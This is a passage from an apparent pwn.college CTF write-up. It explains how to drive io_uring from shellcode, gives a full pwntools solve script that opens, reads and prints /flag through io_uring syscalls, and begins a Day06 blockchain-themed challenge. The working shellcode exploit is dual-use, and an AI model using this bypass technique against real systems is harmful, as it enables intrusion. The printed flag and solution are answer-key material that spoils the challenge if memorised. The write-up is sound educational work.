  <span class="n">__u32</span> <span class="n">wq_fd</span><span class="p">;</span>
  <span class="n">__u32</span> <span class="n">resv</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
  <span class="k">struct</span> <span class="n">io_sqring_offsets</span> <span class="n">sq_off</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">io_cqring_offsets</span> <span class="n">cq_off</span><span class="p">;</span>
<span class="p">};</span>
<span class="kt">int</span> <span class="nf">io_uring_setup</span><span class="p">(</span><span class="n">u32</span> <span class="n">entries</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_uring_params</span> <span class="o">*</span><span class="n">params</span><span class="p">);</span>
</pre></table></code></div></div></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>mov dword ptr [rbx + 8], 0x4000     ; IORING_SETUP_NO_MMAP
mov eax, 425                        ; __NR_io_uring_setup
mov edi, 8                          ; entries
mov rsi, rbx                        ; &amp;params
syscall
mov r13, rax                        ; ring_fd
</pre></table></code></div></div><p>After <code class="language-plaintext highlighter-rouge">io_uring_setup()</code>, the kernel fills <code class="language-plaintext highlighter-rouge">params-&gt;sq_off.*</code> and <code class="language-plaintext highlighter-rouge">params-&gt;cq_off.*</code> with offsets describing where fields like <code class="language-plaintext highlighter-rouge">tail</code>, <code class="language-plaintext highlighter-rouge">mask</code>, <code class="language-plaintext highlighter-rouge">array</code>, and <code class="language-plaintext highlighter-rouge">cqes</code> live relative to the ring base.</p><p>We load the two bases:</p><pre><code class="language-asm">mov r12, qword ptr [rbx + 0x70]     ; ring_base = cq_off.user_addr
mov r14, qword ptr [rbx + 0x48]     ; sqes_base = sq_off.user_addr
</code></pre><p>The offsets provided by the kernel are turned into real pointers via:</p><ul><li><code class="language-plaintext highlighter-rouge">ptr = ring_base + offset</code></ul><pre><code class="language-asm">mov eax, dword ptr [rbx + 0x2c] ; sq_off.tail (offset)
add rax, r12
mov rsi, rax                   ; sq_tail_ptr

mov eax, dword ptr [rbx + 0x30] ; sq_off.ring_mask
add rax, r12
mov rdi, rax                    ; sq_mask_ptr

mov eax, dword ptr [rbx + 0x40] ; sq_off.array
add rax, r12
mov r10, rax                    ; sq_array_base
</code></pre><p>We compute the slot index:</p><pre><code class="language-asm">tail = *sq_tail_ptr
mask = *sq_mask_ptr
idx  = tail &amp; mask
</code></pre><p>Then derive:</p><ul><li><code class="language-plaintext highlighter-rouge">sqe_ptr = sqes_base + idx * 64</code> (SQE is 64 bytes)<li><code class="language-plaintext highlighter-rouge">sq_array_ptr = sq_array_base + idx * 4</code> (u32 index array)</ul><p>and clear the SQE with <code class="language-plaintext highlighter-rouge">memset(sqe, 0, 64)</code>.</p><h4 id="enter"><span class="me-2">Enter</span><a href="#enter" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Each operation is encoded as one 64-byte SQE. The workflow is always:</p><ul><li>pick <code class="language-plaintext highlighter-rouge">idx = tail &amp; mask</code><li>fill <code class="language-plaintext highlighter-rouge">sqe_ptr</code><li>publish <code class="language-plaintext highlighter-rouge">sq_array[idx] = idx</code>, then <code class="language-plaintext highlighter-rouge">tail++</code><li>call <code class="language-plaintext highlighter-rouge">io_uring_enter(ring_fd, 1, 1, GETEVENTS, ‚Ä¶)</code> to submit and wait<li>pop one CQE to get <code class="language-plaintext highlighter-rouge">res</code> (fd or byte count), then <code class="language-plaintext highlighter-rouge">cq_head++</code></ul><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">io_uring_enter</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">to_submit</span><span class="p">,</span>
                          <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">min_complete</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span>
                          <span class="n">sigset_t</span> <span class="o">*</span><span class="n">sig</span><span class="p">);</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">openat(AT_FDCWD, "/flag", O_RDONLY, 0)</code>:</p><p>We create an SQE with opcode <code class="language-plaintext highlighter-rouge">IORING_OP_OPENAT</code> (18). Because the SQE is zeroed first, <code class="language-plaintext highlighter-rouge">open_flags=0</code> (i.e., <code class="language-plaintext highlighter-rouge">O_RDONLY</code>) and <code class="language-plaintext highlighter-rouge">mode=0</code> are already satisfied.</p><div class="table-wrapper"><table><thead><tr><th>Field<th style="text-align: right">Offset<th style="text-align: right">Value<tbody><tr><td>opcode<td style="text-align: right">+0<td style="text-align: right">18<tr><td>fd (dirfd)<td style="text-align: right">+4<td style="text-align: right">-100 (AT_FDCWD)<tr><td>addr<td style="text-align: right">+16<td style="text-align: right">pointer to ‚Äú/flag‚Äù<tr><td>user_data<td style="text-align: right">+32<td style="text-align: right">1</table></div><p>After submitting, we pop one CQE and use <code class="language-plaintext highlighter-rouge">cqe-&gt;res</code> as the returned file descriptor.</p><p><code class="language-plaintext highlighter-rouge">read(flag_fd, buffer_ptr, length)</code> and <code class="language-plaintext highlighter-rouge">write(1, buffer_ptr, length)</code></p><p>We need to take the flag_fd returned from the previous step (stored in r11d in the payload) and use it here and do the same for read and write.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c1">// submit READ(filefd, buf, 100)</span>
<span class="n">idx</span> <span class="o">=</span> <span class="n">sq_tail</span> <span class="o">&amp;</span> <span class="n">sq_mask</span><span class="p">;</span>
<span class="n">sqe</span> <span class="o">=</span> <span class="n">sqes</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span> <span class="n">memset</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">64</span><span class="p">);</span>
<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">opcode</span> <span class="o">=</span> <span class="n">READ</span><span class="p">;</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">=</span><span class="n">filefd</span><span class="p">;</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">addr</span><span class="o">=</span><span class="n">buf</span><span class="p">;</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">len</span><span class="o">=</span><span class="mi">100</span><span class="p">;</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">user_data</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
<span class="n">sq_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">=</span><span class="n">idx</span><span class="p">;</span> <span class="n">sq_tail</span><span class="o">++</span><span class="p">;</span>
<span class="n">io_uring_enter</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">GETEVENTS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">bytes</span> <span class="o">=</span> <span class="n">pop_cqe_res</span><span class="p">();</span>

<span class="c1">// submit WRITE(1, buf, 100)</span>
<span class="n">idx</span> <span class="o">=</span> <span class="n">sq_tail</span> <span class="o">&amp;</span> <span class="n">sq_mask</span><span class="p">;</span>
<span class="n">sqe</span> <span class="o">=</span> <span class="n">sqes</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span> <span class="n">memset</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">64</span><span class="p">);</span>
<span class="n">sqe</span><span class="o">-&gt;</span><span class="n">opcode</span> <span class="o">=</span> <span class="n">WRITE</span><span class="p">;</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">addr</span><span class="o">=</span><span class="n">buf</span><span class="p">;</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">len</span><span class="o">=</span><span class="mi">100</span><span class="p">;</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">user_data</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span>
<span class="n">sq_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">=</span><span class="n">idx</span><span class="p">;</span> <span class="n">sq_tail</span><span class="o">++</span><span class="p">;</span>
<span class="n">io_uring_enter</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">GETEVENTS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</pre></table></code></div></div><details> <summary>Click to view <code>solve.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./sleigh</span><span class="sh">"</span><span class="p">)</span>
<span class="c1"># libc = ELF("./libc", checksec=False)
</span>
<span class="n">HOST</span><span class="o">=</span><span class="sh">""</span>
<span class="n">PORT</span><span class="o">=</span><span class="mi">1337</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>

<span class="n">gdbscript</span><span class="o">=</span><span class="sh">"""</span><span class="s">
b*$rebase(0x000000000000151E)</span><span class="sh">"""</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
        <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">api</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">p</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">run</span><span class="p">()</span>
<span class="n">info</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">success</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sna</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
<span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvn</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>

<span class="n">sc</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span><span class="o">*</span><span class="mi">100</span> <span class="o">+</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"""</span><span class="s">
    sub rsp, 0x4000
    mov rbx, rsp
    mov rdi, rbx
    xor eax, eax
    mov ecx, 0x800
    rep stosq

    mov dword ptr [rbx + 8], 0x4000

    lea rdx, [rbx + 0x800]
    add rdx, 0xfff
    and rdx, 0xfffffffffffff000
    lea rsi, [rdx + 0x2000]

    mov qword ptr [rbx + 0x48], rsi
    mov qword ptr [rbx + 0x50], rdx
    mov qword ptr [rbx + 0x70], rdx

    int3
    mov eax, 425
    mov edi, 8
    mov rsi, rbx
    syscall

    mov r13, rax
    mov r12, qword ptr [rbx + 0x70]
    mov r14, qword ptr [rbx + 0x48]

    lea r15, [rbx + 0x3000]
    mov rax, 0x0067616c662f
    mov qword ptr [r15], rax
    lea rbp, [r15 + 0x10]

    mov eax, dword ptr [rbx + 0x2c]
    add rax, r12
    mov rsi, rax
    mov eax, dword ptr [rbx + 0x30]
    add rax, r12
    mov rdi, rax
    mov eax, dword ptr [rbx + 0x40]
    add rax, r12
    mov r10, rax
    mov eax, dword ptr [rsi]
    mov ecx, dword ptr [rdi]
    mov edx, eax
    and edx, ecx
    mov r8d, edx
    shl r8, 6
    lea r8, [r14 + r8]
    mov r9d, edx
    shl r9, 2
    lea r9, [r10 + r9]
    mov rdi, r8
    xor eax, eax
    mov ecx, 8
    rep stosq
    mov byte  ptr [r8 + 0], 18
    mov dword ptr [r8 + 4], -100
    mov qword ptr [r8 + 16], r15
    mov dword ptr [r8 + 24], 0
    mov dword ptr [r8 + 28], 0
    mov qword ptr [r8 + 32], 1
    mov dword ptr [r9], edx
    add dword ptr [rsi], 1

    mov rdi, r13
    mov esi, 1
    mov edx, 1
    mov r10d, 1
    xor r8d, r8d
    xor r9d, r9d
    mov eax, 426
    syscall

    mov eax, dword ptr [rbx + 0x50]
    add rax, r12
    mov rsi, rax
    mov eax, dword ptr [rbx + 0x58]
    add rax, r12
    mov rdi, rax
    mov eax, dword ptr [rbx + 0x64]
    add rax, r12
    mov r10, rax
    mov eax, dword ptr [rsi]
    mov ecx, dword ptr [rdi]
    mov edx, eax
    and edx, ecx
    mov r9d, edx
    shl r9, 4
    lea r9, [r10 + r9]
    mov eax, dword ptr [r9 + 8]
    add dword ptr [rsi], 1
    mov r11d, eax

    mov eax, dword ptr [rbx + 0x2c]
    add rax, r12
    mov rsi, rax
    mov eax, dword ptr [rbx + 0x30]
    add rax, r12
    mov rdi, rax
    mov eax, dword ptr [rbx + 0x40]
    add rax, r12
    mov r10, rax
    mov eax, dword ptr [rsi]
    mov ecx, dword ptr [rdi]
    mov edx, eax
    and edx, ecx
    mov r8d, edx
    shl r8, 6
    lea r8, [r14 + r8]
    mov r9d, edx
    shl r9, 2
    lea r9, [r10 + r9]
    mov rdi, r8
    xor eax, eax
    mov ecx, 8
    rep stosq

    mov byte ptr [r8 + 0], 22
    mov dword ptr [r8 + 4], r11d
    mov qword ptr [r8 + 8], 0
    mov qword ptr [r8 + 16], rbp
    mov dword ptr [r8 + 24], 100
    mov dword ptr [r8 + 28], 0
    mov qword ptr [r8 + 32], 2

    mov dword ptr [r9], edx
    add dword ptr [rsi], 1

    mov rdi, r13
    mov esi, 1
    mov edx, 1
    mov r10d, 1
    xor r8d, r8d
    xor r9d, r9d
    mov eax, 426
    syscall

    mov eax, dword ptr [rbx + 0x50]
    add rax, r12
    mov rsi, rax
    mov eax, dword ptr [rbx + 0x58]
    add rax, r12
    mov rdi, rax
    mov eax, dword ptr [rbx + 0x64]
    add rax, r12
    mov r10, rax
    mov eax, dword ptr [rsi]
    mov ecx, dword ptr [rdi]
    mov edx, eax
    and edx, ecx
    mov r9d, edx
    shl r9, 4
    lea r9, [r10 + r9]
    mov eax, dword ptr [r9 + 8]
    add dword ptr [rsi], 1
    mov r10d, eax

    mov eax, dword ptr [rbx + 0x2c]
    add rax, r12
    mov rsi, rax
    mov eax, dword ptr [rbx + 0x30]
    add rax, r12
    mov rdi, rax
    mov eax, dword ptr [rbx + 0x40]
    add rax, r12
    mov r10, rax
    mov eax, dword ptr [rsi]
    mov ecx, dword ptr [rdi]
    mov edx, eax
    and edx, ecx
    mov r8d, edx
    shl r8, 6
    lea r8, [r14 + r8]
    mov r9d, edx
    shl r9, 2
    lea r9, [r10 + r9]
    mov rdi, r8
    xor eax, eax
    mov ecx, 8
    rep stosq

    mov byte ptr [r8 + 0], 23
    mov dword ptr [r8 + 4], 1
    mov qword ptr [r8 + 8], 0
    mov qword ptr [r8 + 16], rbp
    mov dword ptr [r8 + 24], 100
    mov dword ptr [r8 + 28], 0
    mov qword ptr [r8 + 32], 3

    mov dword ptr [r9], edx
    add dword ptr [rsi], 1

    mov rdi, r13
    mov esi, 1
    mov edx, 1
    mov r10d, 1
    xor r8d, r8d
    xor r9d, r9d
    mov eax, 426
    syscall

    mov edi, 0
    mov eax, 231
    syscall
</span><span class="sh">"""</span><span class="p">)</span>


<span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">front.</span><span class="sh">"</span><span class="p">,</span> <span class="n">sc</span><span class="p">)</span>

<span class="c1"># p.interactive()
</span><span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvall</span><span class="p">())</span>
</pre></table></code></div></div></details><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{MHh6zxZW0ZZQYJISGy3BrUG3GBS.0FOwkTMywiN1UDN0EzW}</code></p><hr /><h2 id="day06"><span class="me-2">Day06</span><a href="#day06" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-5"><span class="me-2">Description</span><a href="#description-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>üéÑ <strong>North-Poole: The Decentralized Spirit of Christmas</strong> üéÑ</p><p>For centuries, Santa ruled the holidays with a single, all-powerful Naughty-or-Nice list. One workshop. One sleigh. <strong>One very centralized source of truth.</strong></p><p>But after years of ‚Äúmislabeled‚Äù children, delayed gifts, and at least one entire village receiving nothing but the string <strong>‚ÄúAAAAAAAAAA‚Äù</strong> due to an unfortunate buffer overflow in the Letter Sorting Department, global trust has melted faster than a snowman in July. The kids are done relying on a jolly single point of failure.</p><p>Now introducing‚Ä¶</p><p>üéÅ <strong>NiceCoin‚Ñ¢ ‚Äî the world‚Äôs first decentralized, elf-mined, holly-backed virtue token.</strong><br /> <em>Mint your cheer. Secure your joy. Put holiday spirit on the blockchain.</em></p><p>Elves now mine blocks recording verified Nice deeds and mint NiceCoins. Children send signed, on-chain letters to request presents, and Santa‚Äîbound by transparent, immutable consensus‚Äîmust follow the ledger. The workshop is running on proof-of-work, mempools, and a very fragile attempt at ‚Äútrustless‚Äù Christmas cheer.</p><p>Ho-ho-hope you‚Äôre ready. üéÖüî•</p><hr /><h3 id="analysis-5"><span class="me-2">Analysis</span><a href="#analysis-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We‚Äôrs give:</p><details> <summary>Click to view <code>children.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/local/bin/python -u
</span><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">from</span> <span class="n">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">from</span> <span class="n">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>

<span class="n">NORTH_POOLE</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">"</span><span class="s">NORTH_POOLE</span><span class="sh">"</span><span class="p">]</span>
<span class="n">LETTER_HEADER</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Dear Santa,</span><span class="se">\n\n</span><span class="s">For christmas this year I would like </span><span class="sh">"</span>

<span class="n">GIFTS</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">"</span><span class="s">bicycle</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">train set</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">drone</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">robot kit</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">skateboard</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">telescope</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">lego castle</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">paint set</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">guitar</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">soccer ball</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">puzzle box</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">chemistry kit</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">story book</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">piano keyboard</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">rollerblades</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">coding tablet</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">chess set</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">binoculars</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">science lab</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">magic set</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">remote car</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">ukulele</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">basketball</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">hockey stick</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">football</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">dollhouse</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">action figures</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">model airplane</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">rc helicopter</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">night sky map</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">art easel</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">scooter</span><span class="sh">"</span><span class="p">,</span>
<span class="p">]</span>

<span class="n">children</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">children</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Usage: children.py &lt;name&gt; [&lt;name&gt; ...]</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">keys</span> <span class="o">=</span> <span class="p">{}</span>
<span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">children</span><span class="p">:</span>
    <span class="n">key_path</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/keys</span><span class="sh">"</span><span class="p">)</span> <span class="o">/</span> <span class="n">name</span> <span class="o">/</span> <span class="sh">"</span><span class="s">key</span><span class="sh">"</span>
    <span class="n">keys</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">serialization</span><span class="p">.</span><span class="nf">load_ssh_private_key</span><span class="p">(</span><span class="n">key_path</span><span class="p">.</span><span class="nf">read_bytes</span><span class="p">(),</span> <span class="n">password</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">child</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">children</span><span class="p">)</span>
        <span class="n">gift</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">GIFTS</span><span class="p">)</span>
        <span class="n">letter</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">LETTER_HEADER</span><span class="si">}{</span><span class="n">gift</span><span class="si">}</span><span class="sh">"</span>

        <span class="n">letter</span> <span class="o">=</span> <span class="p">{</span>
            <span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="n">child</span><span class="p">,</span>
